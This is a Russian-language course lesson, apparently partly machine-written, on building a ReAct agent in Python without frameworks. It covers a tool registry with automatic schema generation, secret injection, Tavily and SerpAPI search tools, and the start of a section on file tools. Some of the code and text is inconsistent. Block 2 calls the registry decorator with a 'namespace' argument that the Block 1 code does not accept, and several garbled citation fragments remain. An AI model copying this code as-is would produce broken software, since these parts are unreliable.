# Неделя 11: Собственный ReAct-агент с нуля на Python

## О чём эта неделя

Неделя 11 - вы пишете собственный агент с нуля. Никаких фреймворков, только чистый Python и вызовы API. Это лучший способ понять, как работает цикл ReAct изнутри, прежде чем переходить к высокоуровневым инструментам.

**Блоки 1-6 (AI Automation / Python):** Tool Registry как архитектурный паттерн, поисковые инструменты через Tavily/SerpAPI, файловые инструменты с sandbox-ограничениями, обёртка инструментов в FastAPI эндпоинты, декоратор @tool для автогенерации схем, управление зависимостями окружения.

**Блоки 7-10 (Python / AI Agent Builder):** Каноническая логика ReAct (Think -> Act -> Observe), парсинг tool_calls и возврат результатов в историю, защита от бесконечных циклов через max_iterations.

После этой недели вы сможете:
- Написать полный ReAct-цикл (~150 строк Python) без фреймворков
- Зарегистрировать произвольные функции как инструменты агента
- Остановить зависший агент через лимит итераций

---

## Блок 1: Реестр инструментов — архитектура Tool Registry для кастомного агента.

Добро пожаловать в одиннадцатую неделю нашего профессионального курса. В предыдущих модулях мы опирались на готовые SDK (OpenAI, Anthropic) и фреймворки (LangGraph, n8n) для оркестрации ИИ. Мы использовали готовые узлы, чтобы связывать модели с внешним миром. Однако, как гласит Третья Фаза роадмапа AI-инженера: *«Соберите слой обвязки сами... Вы никогда не примете правильные harness-trade-offs в продакшне, пока не соберете свою хотя бы раз»*. 

Переход на уровень Senior AI Architect требует понимания того, как фреймворки работают под капотом. В этом исчерпывающем, монументальном глубоком погружении мы начнем создавать собственного ReAct-агента с нуля на чистом Python. Нашим первым и самым фундаментальным строительным блоком станет **Реестр инструментов (Tool Registry)** - система, которая позволяет агенту детерминированно взаимодействовать с внешним миром. Мы спроектируем систему автогенерации JSON-схем через декораторы, научимся управлять контекстом и изолировать секреты.

---

### Глубокий теоретический анализ: Анатомия Tool Dispatch и Harness Engineering

Прежде чем писать код, необходимо концептуализировать, что именно мы строим. Модель сама по себе не является агентом. 

#### 1. Уравнение агента: Agent = Model + Harness
Как фундаментально определяет статья *The Anatomy of an Agent Harness*: «Сырая модель - это не агент. Но она становится им, когда обвязка (harness) дает ей состояние, выполнение инструментов, циклы обратной связи и выполнимые ограничения». В этой парадигме модель - это мозг, а инструменты - это руки. Согласно *Google Agents Companion*, инструменты критически важны для преодоления разрыва между внутренними возможностями агента и внешним миром. 

#### 2. Слой Tool Dispatch
Реестр инструментов - это не просто словарь (dictionary) с функциями. В современной архитектуре это полноценный слой **Tool Dispatch** (Диспетчеризация инструментов). Согласно роадмапу AI-инженера, этот слой отвечает за: «Реестр, валидация схем, параллельные вызовы, восстановление, retries». 
Когда языковая модель решает вызвать инструмент, она генерирует текстовый JSON. Слой диспетчеризации должен перехватить этот JSON, найти соответствующую Python-функцию, десериализовать аргументы, выполнить функцию в безопасной среде и вернуть результат обратно в текстовом виде, который модель сможет прочитать на следующей итерации.

#### 3. Паттерн прогрессивного раскрытия и автогенерация
Почему мы не пишем JSON-схемы для LLM вручную? Потому что хардкод схем неизбежно приводит к рассинхронизации между реальным кодом Python-функции и тем, что ожидает модель. Роадмап строго предписывает современный паттерн: *«Реестр инструментов через декоратор Python ( @tool ) с автогенерацией JSON-schema»*. Декоратор должен читать аннотации типов (Type Hints) и `__doc__` (Docstrings) вашей функции и динамически компилировать спецификацию инструмента (Tool Spec) для OpenAI или Anthropic. Это гарантирует, что ваш код (Execution layer) и спецификация для LLM (Directive layer) всегда идентичны.

#### 4. Безопасность и брокинг секретов (Secret Broking)
Критическое архитектурное ограничение, о котором забывают новички: *«Auth и брокинг секретов. Учетки никогда не попадают в контекст (паттерн Anthropic Managed Agents)»*. Реестр инструментов должен инжектировать API-ключи, токены и подключения к базе данных непосредственно в Python-функцию в момент выполнения. Модель LLM **никогда** не должна видеть ваши API-ключи в системном промпте или в спецификации инструмента.

---

### Архитектурная схема ASCII: Кастомный Tool Registry Пайплайн

Следующий направленный ациклический граф (DAG) иллюстрирует, как наш реестр изолирует логику выполнения от вероятностной природы LLM.

```ascii
=============================================================================================
 ENTERPRISE TOOL REGISTRY & DISPATCH HARNESS
=============================================================================================

[ 1. DEVELOPER ] -> Writes pure Python function with type hints and docstrings.
 Applies `@tool` decorator.
 |
 v
+-----------------------------------------------------------------------------------------+
| 2. REGISTRY INGESTION LAYER (`ToolRegistry.register()`) |
| - Extracts `__name__` and `__doc__`. |
| - Uses `inspect.signature` to parse parameters and types. |
| - Generates strictly compliant OpenAI/Anthropic JSON Schema. |
| - Stores in `self.tools` dictionary. |
+-----------------------------------------------------------------------------------------+
 |
 +------------------------v------------------------+
 | 3. RE-ACT AGENT LOOP (Orchestrator) |
 | -> LLM generates `{ "name": "fetch_data", |
 | "arguments": {"id": 1} }` |
 +-------------------------------------------------+
 |
 v
+-----------------------------------------------------------------------------------------+
| 4. TOOL DISPATCH & EXECUTION LAYER (`ToolRegistry.execute()`) |
| - Intercepts raw JSON tool call from LLM. |
| - Retrieves actual Python function from registry. |
| - INJECTS Context (e.g., DB session, hidden API keys) bypassing the LLM. |
| - Executes function: `result = func(**arguments)` |
+-----------------------------------------------------------------------------------------+
 / (Success) \ (Exception / Failure)
 v v
[ 5A. CLEAN OBSERVATION ] +---------------------------------------+
- Return JSON/String result to LLM. | 5B. THE DIAGNOSTIC LOOP |
- State appended to Conversation History. | - Catch Exception natively. |
 | - Format actionable error msg. |
 | - Return error to LLM for Self-Heal. |
 +---------------------------------------+
=============================================================================================
```

---

### Подробное практическое руководство и продакшн-код

Мы разработаем ядро нашего ReAct-агента: класс `ToolRegistry` и декоратор `@tool`. Этот код будет написан с учетом строгой типизации и наблюдаемости (Observability).

#### Шаг 1: Инженерия Декоратора и Экстракции Схем
Наша первая задача - написать логику, которая превращает обычную функцию в JSON-схему. Мы используем библиотеку `inspect` для анализа сигнатуры.

```python
import inspect
import json
import logging
from typing import Callable, Dict, Any, List, Type

# Лекция 11: Сделайте рантайм агента наблюдаемым 
logging.basicConfig(level=logging.INFO, format='%(asctime)s - [TOOL_REGISTRY] - %(levelname)s: %(message)s')

class ToolRegistry:
 """
 Энтерпрайз-реестр инструментов для автономных агентов.
 Обеспечивает автогенерацию схем, диспетчеризацию вызовов и брокинг секретов.
 """
 def __init__(self):
 self._tools: Dict[str, Callable] = {}
 self._schemas: List[Dict[str, Any]] = []

 def _python_type_to_json_type(self, py_type: Type) -> str:
 """Вспомогательный метод для маппинга типов Python в типы JSON Schema."""
 mapping = {
 int: "integer",
 float: "number",
 str: "string",
 bool: "boolean",
 list: "array",
 dict: "object"
 }
 return mapping.get(py_type, "string") # По умолчанию string для безопасности

 def register(self, func: Callable) -> Callable:
 """
 Декоратор, который регистрирует функцию в реестре и компилирует ее JSON-схему.
 Соответствует паттерну из Фазы 3 Роадмапа.
 """
 name = func.__name__
 docstring = inspect.getdoc(func)
 
 if not docstring:
 raise ValueError(f"Function '{name}' must have a docstring to act as a tool description.")
 
 # 1. Извлечение сигнатуры функции
 sig = inspect.signature(func)
 parameters = {}
 required = []
 
 for param_name, param in sig.parameters.items():
 # Пропускаем параметры контекста, которые инжектируются обвязкой (брокинг секретов)
 if param_name == "context":
 continue
 
 param_type = param.annotation if param.annotation!= inspect.Parameter.empty else str
 parameters[param_name] = {
 "type": self._python_type_to_json_type(param_type),
 "description": f"Parameter {param_name}" # В проде извлекается из docstring
 }
 
 if param.default == inspect.Parameter.empty:
 required.append(param_name)

 # 2. Компиляция OpenAI-совместимой схемы инструмента
 tool_schema = {
 "type": "function",
 "function": {
 "name": name,
 "description": docstring.strip(),
 "parameters": {
 "type": "object",
 "properties": parameters,
 "required": required
 }
 }
 }
 
 # 3. Регистрация
 self._tools[name] = func
 self._schemas.append(tool_schema)
 logging.info(f"Registered tool: '{name}' with {len(parameters)} parameters.")
 
 return func

 def get_all_schemas(self) -> List[Dict[str, Any]]:
 """Возвращает массив схем для встраивания в API-вызов к LLM."""
 return self._schemas
```

#### Шаг 2: Реализация Диспетчера и Диагностической Петли
Теперь реализуем метод `execute`, который будет принимать команду от LLM, находить инструмент и безопасно его выполнять.

```python
 def execute(self, tool_name: str, raw_arguments: str, hidden_context: Dict[str, Any] = None) -> str:
 """
 Слой диспетчеризации инструментов (Tool Dispatch).
 Выполняет инструмент, перехватывает ошибки и возвращает строковый результат.
 """
 if tool_name not in self._tools:
 error_msg = f"Error: Tool '{tool_name}' not found in registry. Available tools: {list(self._tools.keys())}."
 logging.error(error_msg)
 return error_msg
 
 func = self._tools[tool_name]
 
 # Десериализация аргументов, сгенерированных LLM
 try:
 arguments = json.loads(raw_arguments) if raw_arguments else {}
 except json.JSONDecodeError as e:
 return f"Error: Invalid JSON arguments provided. Details: {str(e)}"
 
 # Брокинг секретов: инжектируем контекст (например, API ключи), невидимый для LLM 
 if "context" in inspect.signature(func).parameters:
 arguments["context"] = hidden_context or {}

 logging.info(f"Dispatching tool '{tool_name}' with args: {raw_arguments}")
 
 # Выполнение инструмента и Diagnostic Loop (Диагностическая петля) 
 try:
 result = func(**arguments)
 return str(result)
 except TypeError as e:
 # Несовпадение параметров
 return f"TypeError: Incorrect arguments for '{tool_name}'. Details: {str(e)}. Please review the tool schema."
 except Exception as e:
 # Лекция 10: Сообщения об ошибках должны включать инструкции по исправлению 
 error_feedback = (
 f"Execution Exception in '{tool_name}': {str(e)}\n"
 f"Fix Instructions: Review the data you provided. Ensure it meets the business logic constraints."
 )
 logging.warning(error_feedback)
 return error_feedback

# Инициализация глобального реестра
registry = ToolRegistry()
```

#### Шаг 3: Практическое применение (Создание инструментов)
Обратите внимание, насколько чистым становится код разработчика (Execution Layer). LLM видит только `location`, но функция получает `context` с API-ключом, скрытым от нейросети.

```python
@registry.register
def fetch_weather(location: str, context: Dict[str, Any]) -> str:
 """
 Fetches the current weather for a specific city or location.
 Use this tool when the user asks about meteorological conditions.
 """
 api_key = context.get("WEATHER_API_KEY")
 if not api_key:
 raise ValueError("System Error: Weather API Key is missing from context.")
 
 # Симуляция запроса к внешнему API
 logging.info(f"Fetching weather for {location} securely using internal key.")
 if location.lower() == "london":
 return '{"temp_c": 15, "condition": "Rainy"}'
 return '{"temp_c": 22, "condition": "Sunny"}'

@registry.register
def query_database(sql_query: str) -> str:
 """
 Executes a SELECT query on the company database.
 WARNING: Do not use for modifications (INSERT/UPDATE).
 """
 # Симуляция БД
 return f"Query executed successfully. Found 3 rows."

# ==========================================
# Имитация работы ReAct Агента
# ==========================================
if __name__ == "__main__":
 # 1. Мы передаем схемы в LLM
 print("Schemas given to LLM:\n", json.dumps(registry.get_all_schemas(), indent=2))
 
 # 2. LLM решает вызвать инструмент (имитация ответа от GPT-4o или Claude)
 llm_tool_choice = "fetch_weather"
 llm_arguments = '{"location": "London"}'
 
 # 3. Harness выполняет диспетчеризацию, инжектируя секретный контекст
 hidden_system_context = {"WEATHER_API_KEY": "sk-live-12345"}
 
 observation = registry.execute(
 tool_name=llm_tool_choice, 
 raw_arguments=llm_arguments, 
 hidden_context=hidden_system_context
 )
 
 print("\nObservation returned to LLM:\n", observation)
```

В этой архитектуре мы разделили ответственность: LLM - это маршрутизатор намерений, а `ToolRegistry` - это детерминированная машинерия.

---

### Реальные бизнес-применения и юнит-экономика

Зачем писать свой `ToolRegistry`, если можно использовать n8n, где, как отмечается в статье Хабра, *«подключить по API почти все что угодно можно за 10 минут»*? 

**1. Enterprise-интеграция с легаси-системами (Custom Internal APIs)**
No-code платформы вроде n8n или Make идеальны для стандартных SaaS-сервисов (Slack, Gmail). Но что, если агенту нужно работать с самописной ERP-системой завода или напрямую обращаться к проприетарной базе данных PostgreSQL через сложный ORM? Как указано в статье «Пишем свою ноду в n8n под любой API за вечер», создание кастомных узлов требует погружения во внутренности n8n. 
Имея собственный `ToolRegistry` на Python, вы можете за 5 минут обернуть вашу существующую бизнес-логику декоратором `@tool`, мгновенно предоставив агенту доступ к внутренним корпоративным ресурсам без миграции их в сторонние платформы. Это снижает Time-to-Market для кастомных AI-фич в enterprise-командах с месяцев до дней.

**2. Безопасность уровня Enterprise (Zero-Trust LLM)**
Когда вы передаете разработку агентов в n8n, ключи авторизации управляются платформой. В строго регулируемых отраслях (FinTech, MedTech) передача клиентских данных и токенов в промпты или сторонние узлы недопустима. В нашей архитектуре реестра, ключи авторизации инжектируются из защищенного Vault напрямую В источниках словаря функции в рантайме. LLM **буквально не подозревает** о существовании API-ключей, что делает невозможным их утечку при атаках типа *Prompt Injection*. Это позволяет пройти аудит безопасности (Compliance Audit) для запуска ИИ в банковском секторе.

---

### Edge-cases, частые ошибки, Rate Limits и циклы отладки

Создание слоя диспетчеризации (Tool Dispatch) чревато тонкими багами, которые могут привести к бесконечным циклам агента.

> [!CAUTION] 
> **Ошибка: Падение всего агента из-за необработанного исключения в инструменте** 
> **Сценарий:** Агент решает вызвать `query_database("SELECT * FROM users")`. База данных возвращает `TimeoutError`. Если функция инструмента просто "упадет" (выбросит исключение, которое не перехватит `ToolRegistry`), скрипт Python завершится с фатальной ошибкой (Crash). Агент «умрет» прямо посреди мыслительного процесса. 
> **Harness Mitigation:** Как реализовано в нашем коде, блок `execute` обернут в `try...except Exception as e`. Любая ошибка внутри инструмента должна перехватываться обвязкой (harness) и возвращаться обратно агенту в виде **строки наблюдения (Observation String)**. Это активирует *Diagnostic Loop*: агент читает: `"Execution Exception: Database Timeout"`, понимает, что инструмент не сработал, и автономно принимает решение: либо подождать, либо использовать другой инструмент, либо сообщить пользователю об ошибке.

> [!WARNING] 
> **Ошибка: Галлюцинация аргументов и типов данных** 
> **Проблема:** LLM иногда игнорирует вашу JSON-схему. Она может отправить `{"user_id": "one"}` вместо `{"user_id": 1}`. Python-функция попытается выполнить операцию и упадет с `TypeError`. 
> **Диагностическая петля:** В продакшене слой `ToolRegistry` часто усиливают интеграцией с `Pydantic`. Вместо простого `json.loads` диспетчер должен передавать сырой JSON в Pydantic-модель, сгенерированную на лету. Если Pydantic возвращает `ValidationError`, обвязка формирует детальное сообщение об ошибке (как требует Лекция 10: "Сообщения об ошибках должны включать инструкции по исправлению" ), например: `Validation Error: user_id must be an integer, got string. Rewrite your tool call.` Агент мгновенно учится на ошибке и присылает верный JSON на следующем ходу.

> [!NOTE] 
> **Rate Limits и проблема "Слепого блуждания"** 
> **Проблема:** Инструмент `fetch_weather` ограничен 5 вызовами в секунду (HTTP 429). Агент вызывает инструмент, получает ответ "Rate Limit Exceeded", и в панике начинает вызывать его снова и снова в цикле (Doom Loop), сжигая ваш бюджет токенов. "Без наблюдаемости агенты принимают решения в условиях неопределённости... ретраи превращаются в слепое блуждание". 
> **Решение:** Не полагайтесь на то, что LLM сама поймет концепцию "экспоненциальной задержки" (Exponential Backoff). Ваша функция, обернутая в `@tool`, должна внутри себя использовать декоратор `@retry_with_backoff` (который мы написали на Неделе 9). Инструмент должен самостоятельно уснуть и восстановиться, прежде чем возвращать управление агенту, тем самым защищая когнитивный цикл (ReAct loop) от сетевого шума.

Освоив создание собственного `ToolRegistry`, вы создали мощный фундамент (Harness) для любого автономного агента. Ваш код теперь динамически описывает себя для нейросетей, безопасно инжектирует конфиденциальный контекст и превращает фатальные ошибки Python в обучающую обратную связь для LLM. 

В следующем блоке мы перейдем от создания инструментов к написанию самого сердца системы - цикла рассуждения и действий (The ReAct Loop).

---

## Блок 2: Поисковые инструменты — подключение Tavily API / SerpAPI в качестве инструментов.

В предыдущем блоке мы заложили фундаментальный строительный блок нашей автономной когнитивной архитектуры - **Реестр инструментов (Tool Registry)**. Мы создали диспетчер, который изолирует секреты, динамически генерирует JSON-схемы для LLM и перехватывает ошибки Python. Теперь наш агент обладает «руками», но он всё ещё слеп. Его знания ограничены датой отсечки (cutoff date) тренировочного датасета, что делает его абсолютно бесполезным для реальных бизнес-задач, требующих актуальных данных.

Как отмечается в руководстве *карта развития ИИ-Агентов*, разработка агентов требует реализации конкретных поисковых примитивов: «Три инструмента: web_search через Tavily или Firecrawl, read_file, write_file». Более того, в паттерне Web Access (доступ к сети) описано: «Рабочий процесс инициируется WebSearchAgent, который принимает пользовательский ввод и формулирует оптимизированные поисковые запросы... Эти запросы затем выполняются с использованием SERP API для получения результатов поиска Google».

В этом исчерпывающем, монументальном глубоком погружении мы дадим нашему ReAct-агенту глаза. Мы проведем глубокий сравнительный анализ SerpAPI и Tavily API, интегрируем их в наш кастомный `ToolRegistry`, разберем паттерны изоляции контекста и защитим систему от проблемы «слепого блуждания» (blind wandering) при столкновении с лимитами поисковых систем.

---

### Глубокий теоретический анализ: Механика поискового ReAct-цикла

Поисковые инструменты - это не просто вызов стороннего API. Это сложный когнитивный цикл, в котором агент учится формулировать запросы, читать сниппеты (snippets) и делать выводы.

#### 1. Анатомия ReAct-поиска (Reason + Act)
Как показано в официальном Whitepaper от Google (*2025_01_18_pdf_1_TechAI_Goolge_whitepaper_Prompt_Engineering_v4*), при подключении инструмента `serpapi` агент начинает мыслить итеративно. В классическом примере с группой Metallica агент не пытается угадать ответ. Вместо этого он генерирует цепочку поисковых запросов:
«ReAct делает цепочку из пяти поисковых запросов. Фактически, LLM скрейпит результаты поиска Google, чтобы выяснить имена участников группы. Затем она перечисляет результаты как наблюдения (observations) и связывает мысли для следующего поиска... выясняет, что в группе Metallica четыре участника. Затем она ищет каждого участника группы, чтобы запросить количество детей и сложить общее количество»,.
Этот процесс (Thought -> Action -> Observation -> Thought) является ядром поисковой архитектуры.

#### 2. Проблема сырого SERP vs. LLM-оптимизированный поиск
Архитектор должен понимать разницу между традиционными API и API для агентов:
* **SerpAPI (или Google Custom Search):** Возвращает сырой JSON, имитирующий страницу выдачи Google (SERP). Агент видит только заголовки, ссылки и короткие сниппеты. Если нужной информации в сниппете нет, агенту нужен дополнительный инструмент для перехода по ссылке и парсинга HTML (например, через Playwright или BeautifulSoup). Это тратит драгоценные токены и шаги рассуждения.
* **Tavily API / Firecrawl:** Это поисковики, созданные *специально для LLM*. Они автономно обходят несколько ссылок из выдачи, извлекают релевантный контент, очищают его от мусора и возвращают чистый Markdown-текст, идеально подходящий для контекстного окна агента,. Ник Сараев в своем курсе подчеркивает это в системных промптах: «always use the Tavly search tool to find accurate information write an informative engaging tweet include a brief reference to the source». 

#### 3. Паттерн "Filesystem Offload" и Изоляция Контекста
Критическая ошибка джуниоров - возвращать сырой результат поиска (особенно массивные статьи) прямо в главное контекстное окно агента-оркестратора. Как строго указано в *карта развития ИИ-Агентов*: «Суб-агенты вызывают Tavily или Firecrawl, пишут результаты в файлы, возвращают короткие саммари. Никаких сырых результатов поиска в контекст родителя». Мы должны использовать файловую систему как буфер обмена, чтобы не раздувать контекст и не замедлять генерацию.

---

### Архитектурная схема ASCII: Инъекция поискового инструмента в ReAct

Следующий направленный ациклический граф (DAG) иллюстрирует, как поисковый инструмент встраивается в наш Harness, взаимодействует с интернетом и возвращает очищенные данные.

```ascii
=============================================================================================
 ENTERPRISE WEB SEARCH DISPATCH HARNESS
=============================================================================================

[ 1. ReAct ORCHESTRATOR ]
Thought: "I need to find the latest 2026 AI automation trends."
Action: `{"name": "web_tavily_search", "arguments": {"query": "AI automation trends 2026"}}`
 |
 v
+-----------------------------------------------------------------------------------------+
| 2. TOOL REGISTRY DISPATCH (From Block 1) |
| - Validates JSON arguments. |
| - INJECTS `TAVILY_API_KEY` into execution context (Secret Broking). |
+-----------------------------------------------------------------------------------------+
 |
 v
+-----------------------------------------------------------------------------------------+
| 3. SEARCH EXECUTION ENGINE (Python Tool) |
| -> Sends HTTP POST to https://api.tavily.com/search |
| -> Receives deep-scraped markdown content. |
+-----------------------------------------------------------------------------------------+
 | (Success: Heavy Content) | (HTTP 429 Rate Limit / Timeout)
 v v
[ 4A. FILESYSTEM OFFLOAD PATTERN ] +--------------------------------------------+
- Saves 50KB markdown to disk. | 4B. DIAGNOSTIC LOOP (Lecture 11) |
 (`workspace/`) | - Logs: "Tavily API Rate Limit Exceeded" |
- Returns 200-character Summary & Path: | - Executes `@retry_with_backoff` logic. |
 `"Search saved to disk. Summary:..."` | - If fails, returns string error to LLM. |
 +--------------------------------------------+
```

---

### Подробное практическое руководство и продакшн-код

Давайте расширим наш `ToolRegistry`, добавив в него production-grade поисковые инструменты. Мы реализуем как классический SerpAPI, так и LLM-ориентированный Tavily API.

#### Шаг 1: Интеграция SerpAPI (Для сырой выдачи Google)
Этот инструмент полезен, когда агенту нужно просто найти ссылки, проверить рейтинги или собрать базу сайтов (без их глубокого парсинга).

```python
import os
import requests
import json
import logging
from typing import Dict, Any

# Подключаем наш ToolRegistry из Блока 1
from agent_harness import registry

logging.basicConfig(level=logging.INFO, format='%(asctime)s - [SEARCH_TOOL] - %(message)s')

@registry.register(namespace="web")
def serpapi_search(query: str, num_results: int = 5, context: Dict[str, Any] = None) -> str:
 """
 Выполняет поиск в Google через SerpAPI.
 Используйте этот инструмент, когда нужно получить список ссылок, 
 заголовков статей или коротких сниппетов. Не подходит для глубокого чтения статей.:param query: Поисковый запрос (максимально точный).:param num_results: Количество возвращаемых результатов (макс 10).
 """
 api_key = context.get("SERPAPI_API_KEY") if context else os.environ.get("SERPAPI_API_KEY")
 if not api_key:
 raise ValueError("System Error: SERPAPI_API_KEY is missing from context.")
 
 logging.info(f"Executing SerpAPI search for query: '{query}'")
 
 params = {
 "engine": "google",
 "q": query,
 "api_key": api_key,
 "num": num_results
 }
 
 try:
 response = requests.get("https://serpapi.com/search", params=params, timeout=10)
 response.raise_for_status()
 data = response.json()
 
 # Форматируем органическую выдачу в читаемый для LLM текст
 organic_results = data.get("organic_results", [])
 if not organic_results:
 return "Observation: No search results found for this query."
 
 formatted_results = "--- SEARCH RESULTS ---\n"
 for idx, result in enumerate(organic_results, 1):
 formatted_results += f"{idx}. Title: {result.get('title')}\n"
 formatted_results += f" Link: {result.get('link')}\n"
 formatted_results += f" Snippet: {result.get('snippet')}\n\n"
 
 return formatted_results
 
 except requests.exceptions.RequestException as e:
 # Лекция 11: Сообщения об ошибках должны возвращаться агенту
 error_msg = f"Network Error during SerpAPI call: {str(e)}. Try refining your query."
 logging.error(error_msg)
 return error_msg
```

#### Шаг 2: Интеграция Tavily API с паттерном Filesystem Offload
Это продвинутый инструмент. Tavily не просто ищет ссылки, он переходит по ним и извлекает контент. Поскольку контент может весить десятки килобайт, мы реализуем сохранение результатов на диск, возвращая агенту только путь и краткое саммари.

```python
import hashlib

@registry.register(namespace="web")
def tavily_deep_research(query: str, context: Dict[str, Any] = None) -> str:
 """
 Выполняет глубокий AI-оптимизированный поиск через Tavily.
 Используйте этот инструмент для подробного исследования темы.
 Инструмент вернет короткое саммари, а полный текст сохранит в локальный файл.:param query: Развернутый исследовательский запрос.
 """
 api_key = context.get("TAVILY_API_KEY") if context else os.environ.get("TAVILY_API_KEY")
 if not api_key:
 raise ValueError("System Error: TAVILY_API_KEY is missing from context.")
 
 logging.info(f"Initiating Tavily Deep Research for: '{query}'")
 
 payload = {
 "api_key": api_key,
 "query": query,
 "search_depth": "advanced", # Указывает Tavily проводить глубокий поиск
 "include_answer": True, # Tavily сам сгенерирует саммари
 "include_raw_content": True # Получаем полный текст статей
 }
 
 try:
 response = requests.post("https://api.tavily.com/search", json=payload, timeout=25)
 response.raise_for_status()
 data = response.json()
 
 # 1. Извлекаем ответ (summary), сгенерированный самим Tavily
 ai_answer = data.get("answer", "No direct answer generated.")
 
 # 2. Filesystem Offload (карта развития ИИ-Агентов Phase 3)
 raw_results = data.get("results", [])
 if raw_results:
 # Создаем уникальное имя файла на основе хеша запроса
 query_hash = hashlib.md5(query.encode()).hexdigest()[:8]
 filename = f"workspace/research_{query_hash}.txt"
 
 # Убедимся, что директория существует
 os.makedirs("workspace", exist_ok=True)
 
 with open(filename, "w", encoding="utf-8") as f:
 f.write(f"FULL RESEARCH FOR: {query}\n\n")
 for item in raw_results:
 f.write(f"URL: {item.get('url')}\n")
 f.write(f"CONTENT:\n{item.get('raw_content', 'No content')}\n")
 f.write("-" * 40 + "\n")
 
 observation = (
 f"Tavily Summary: {ai_answer}\n"
 f"SYSTEM NOTE: Full raw content of all articles has been saved to '{filename}'. "
 f"If you need more details, use the 'read_file' tool on this path."
 )
 return observation
 else:
 return f"Tavily Summary: {ai_answer}\nNo deep content was found."
 
 except requests.exceptions.RequestException as e:
 return f"Tavily API failed: {str(e)}. Proceed with current knowledge or use another tool."
```

---

### Реальные бизнес-применения и юнит-экономика

Поисковые инструменты превращают агента из простого «текстового генератора» в мощную автономную машину, способную влиять на реальные бизнес-метрики.

**1. Контент-движки и SMM-автоматизация (Content Production)**
Как подробно описывается в курсе Ника Сараева по n8n (источники,, ), компании используют поисковые инструменты для автоматического ведения соцсетей (LinkedIn, X/Twitter). Агент получает триггер с темой (например, «coffee at night»), вызывает `tavily_search` для поиска точных фактов и медицинских статей о влиянии кофеина. Затем агент синтезирует пост. 
*Бизнес-ценность:* В системном промпте жестко прописано: «always use the Tavly search tool to find accurate information write an informative engaging tweet include a brief reference to the source». Это исключает публикацию галлюцинированных фактов от лица бренда, защищая репутацию компании и экономя до $1,000/мес на услугах копирайтера-ресечера.

**2. Глубокое многоагентное исследование (Deep Agent Research Analyst)**
Anthropic описывает архитектуру для глубоких исследований: «Когда пользователь отправляет запрос... Lead-агент спавнит суб-агентов для параллельного исследования разных аспектов. Суб-агенты действуют как интеллектуальные фильтры, итеративно используя инструменты поиска...». В нашем роадмапе это Практический проект Фазы 2: «Суб-агенты вызывают Tavily... пишут результаты в файлы, возвращают короткие саммари». 
Например, аналитик венчурного фонда (VC) запускает агента с запросом «Проанализируй рынок AI-агентов в 2026 году». Агент делает 15 поисковых запросов в фоне, читает 40 статей через Tavily, сохраняет 2 мегабайта текста в папку `workspace/` и выдает финальный Markdown-отчет с цитатами. Это ускоряет исследовательский процесс на порядки.

---

### Edge-cases, частые ошибки, Rate Limits и циклы отладки

Интеграция с нестабильным внешним интернетом - самая хрупкая часть любого ИИ-агента. Архитектор должен проектировать обвязку (harness) с учетом постоянных сбоев.

> [!CAUTION] 
> **Иллюзия завершенности (Verification Gap)** 
> **Ошибка:** Агент запрашивает поиск, но API возвращает ошибку (например, пустой массив результатов). Модель игнорирует ошибку, генерирует ответ на основе своих старых (галлюцинированных) весов и заявляет: "Я провел исследование и вот результат". Это классический *Verification Gap* (Лекция 1: «разрыв между уверенностью агента в своей работе и реальной корректностью» ). 
> **Harness Mitigation:** В системном промпте (внутри файла ``) должно быть жесткое правило: «Если инструмент поиска возвращает ошибку или пустоту, ВЫ НЕ ИМЕЕТЕ ПРАВА придумывать ответ. Вы обязаны вернуть пользователю статус "Недостаточно данных" или перефразировать поисковый запрос».

> [!WARNING] 
> **Слепое блуждание (Blind Wandering) при Rate Limits** 
> **Проблема:** Вы используете бесплатный тариф SerpAPI (100 запросов в месяц). Агент исчерпывает лимит и получает код HTTP 429. Как предупреждает Лекция 11: «Без наблюдаемости агенты принимают решения в условиях неопределённости... а ретраи превращаются в слепое блуждание». Агент будет в цикле снова и снова вызывать поиск, сжигая бюджет LLM-токенов на анализ ошибок. 
> **Диагностическая петля:** Во-первых, обвязка должна иметь декоратор `@retry_with_backoff` (изученный нами на Неделе 9). Во-вторых, если лимит жестко исчерпан, инструмент должен вернуть агенту строку: `"CRITICAL: Search API quota exceeded. DO NOT attempt to search again in this session. Conclude your task using existing data."` Агент поймет это наблюдение и прекратит цикл.

> [!NOTE] 
> **Проблема Context Bloat (Переполнение контекста)** 
> Скрейпинг сырых страниц через SerpAPI приводит к тому, что агент получает сотни килобайт HTML-тегов, скриптов и CSS. Это мгновенно переполняет контекстное окно. Всегда используйте инструменты вроде Tavily, которые автономно очищают HTML, или (если пишете скрейпер сами) обязательно пропускайте HTML через BeautifulSoup/Playwright для извлечения только тегов `<p>` и `<h1>`, прежде чем вернуть строку в ReAct-цикл.

Подключив Tavily и SerpAPI, мы стерли границу между знаниями модели и реальным миром. Теперь наш кастомный ReAct-агент может исследовать сеть, читать актуальные новости и сохранять массивы данных на жесткий диск. 

Готовы ли вы перейти к Блоку 3, где мы напишем само «сердце» системы - цикл `while`, который объединит языковую модель, реестр инструментов и парсинг ответов в единый, безостановочный процесс мышления и действий?

---

## Блок 3: Файловые инструменты — безопасное чтение, запись и редактирование файлов на диске.

В предыдущих блоках мы разработали ядро нашего агента - реестр инструментов (Tool Registry) и снабдили его способностью видеть мир через API поисковых систем (Tavily, SerpAPI). Однако агент, который умеет только читать веб-страницы и возвращать текст в консоль, остаётся не более чем продвинутым чат-ботом. Чтобы агент стал полноценным цифровым сотрудником, способным создавать ценность, он должен уметь изменять своё окружение. 

Как строго предписывает Фаза 1 архитектурного роадмапа AI-инженера, минимальный жизнеспособный агент требует реализации трёх базовых примитивов: «Три инструмента: web_search через Tavily или Firecrawl, read_file, write_file». Доступ к локальной файловой системе - это то, что превращает агента из наблюдателя в создателя, позволяя ему вести логи, рефакторить кодовые базы, сохранять отчёты и управлять собственным контекстом.

В этом исчерпывающем, монументальном глубоком погружении мы разработаем слой файловых операций (Filesystem Tools). Мы не просто напишем функции `open()`. Мы спроектируем энтерпрайз-песочницу с защитой от уязвимостей типа Path Traversal, внедрим паттерн "Filesystem Offload" для разгрузки контекстного окна и изучим, как файловая система служит долговременной памятью для агентов, страдающих «амнезией».

---

### Глубокий теоретический анализ: Файловая система как память и песочница

Передача агенту прав на изменение файлов на вашем диске - это архитектурный Рубикон. Если вы сделаете это неправильно, агент может случайно удалить исходный код или прочитать файлы `.env` с продакшн-ключами.

#### 1. Файловая система как долговременная память (Durable Memory)
Современные Large Language Models имеют конечные контекстные окна. Как объясняется в *Лекции 05. Сохраняйте контекст между сессиями*, в многосессионных задачах агенты работают как мастера с амнезией: «Относитесь к агенту как к гениальному инженеру с амнезией. Прежде чем "уйти со смены", он должен записать критическую информацию, чтобы следующий "сменный" агент мог быстро подхватить работу». 
